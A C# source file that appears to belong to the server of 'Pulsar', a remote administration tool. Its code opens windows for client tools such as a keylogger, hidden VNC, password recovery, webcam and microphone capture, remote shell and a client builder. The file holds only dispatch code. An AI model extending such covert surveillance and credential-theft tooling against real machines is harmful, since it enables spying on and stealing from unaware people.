using System;
using Pulsar.Server.Forms;
using Pulsar.Server.Networking;

namespace Pulsar.Server.Services.Wpf
{
    public enum ClientToolType
    {
        Microphone,
        SystemAudio,
        RemoteDesktop,
        Webcam,
        Keylogger,
        FileManager,
        RemoteShell,
        RemoteExecution,
        Hvnc,
        SystemInformation,
        TaskManager,
        StartupManager,
        RegistryEditor,
        TcpConnections,
        ReverseProxy,
        PasswordRecovery,
        RemoteChat
    }

    public enum ServerWindowType
    {
        Settings,
        Builder,
        Keywords,
        About
    }

    /// <summary>
    /// Abstraction for launching interactive client tool modules from MainViewModel.
    /// </summary>
    public interface IClientToolLauncher
    {
        void Launch(ClientToolType tool, Client client);
    }

    /// <summary>
    /// Abstraction for launching top-level server utility windows (Settings, Builder, Keywords, About).
    /// </summary>
    public interface IServerWindowLauncher
    {
        void Launch(ServerWindowType windowType, PulsarServer server);
    }

    /// <summary>
    /// Launches the existing Pulsar Server client tool windows for a connected client.
    /// </summary>
    public sealed class WinFormsClientToolLauncher : IClientToolLauncher
    {
        public void Launch(ClientToolType tool, Client client)
        {
            if (client == null)
            {
                throw new ArgumentNullException(nameof(client));
            }

            switch (tool)
            {
                case ClientToolType.Microphone:
                    ShowAndFocus(FrmRemoteMic.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.SystemAudio:
                    ShowAndFocus(FrmRemoteSystemAudio.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.RemoteDesktop:
                    ShowAndFocus(FrmRemoteDesktop.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.Webcam:
                    ShowAndFocus(FrmRemoteWebcam.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.Keylogger:
                    ShowAndFocus(FrmKeylogger.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.FileManager:
                    ShowAndFocus(FrmFileManager.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.RemoteShell:
                    ShowAndFocus(FrmRemoteShell.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.RemoteExecution:
                    ShowAndFocus(new FrmRemoteExecution(new[] { client }));
                    break;
                case ClientToolType.Hvnc:
                    ShowAndFocus(FrmHVNC.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.SystemInformation:
                    ShowAndFocus(FrmSystemInformation.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.TaskManager:
                    ShowAndFocus(FrmTaskManager.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.StartupManager:
                    ShowAndFocus(FrmStartupManager.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.RegistryEditor:
                    ShowAndFocus(FrmRegistryEditor.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.TcpConnections:
                    ShowAndFocus(FrmConnections.CreateNewOrGetExisting(client));
                    break;
                case ClientToolType.ReverseProxy:
                    ShowAndFocus(new FrmReverseProxy(new[] { client }));
                    break;
                case ClientToolType.PasswordRecovery:
                    ShowAndFocus(new FrmPasswordRecovery(new[] { client }));
                    break;
                case ClientToolType.RemoteChat:
                    ShowAndFocus(FrmRemoteChat.CreateNewOrGetExisting(client));
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(tool), tool, "Unsupported client tool.");
            }
        }

        private static void ShowAndFocus(System.Windows.Forms.Form form)
        {
            if (form == null || form.IsDisposed)
            {
                return;
            }

            form.Show();
            form.Focus();
        }
    }

    /// <summary>
    /// Launches top-level WinForms server configuration and utility dialogs.
    /// </summary>
    public sealed class WinFormsServerWindowLauncher : IServerWindowLauncher
    {
        public void Launch(ServerWindowType windowType, PulsarServer server)
        {
            switch (windowType)
            {
                case ServerWindowType.Settings:
                    using (var frm = new FrmSettings(server))
                    {
                        frm.ShowDialog();
                    }
                    break;
                case ServerWindowType.Builder:
                    using (var frm = new FrmBuilder())
                    {
                        frm.ShowDialog();
                    }
                    break;
                case ServerWindowType.Keywords:
                    using (var frm = new FrmKeywords())
                    {
                        frm.ShowDialog();
                    }
                    break;
                case ServerWindowType.About:
                    using (var frm = new FrmAbout())
                    {
                        frm.ShowDialog();
                    }
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(windowType), windowType, "Unsupported server window.");
            }
        }
    }
}
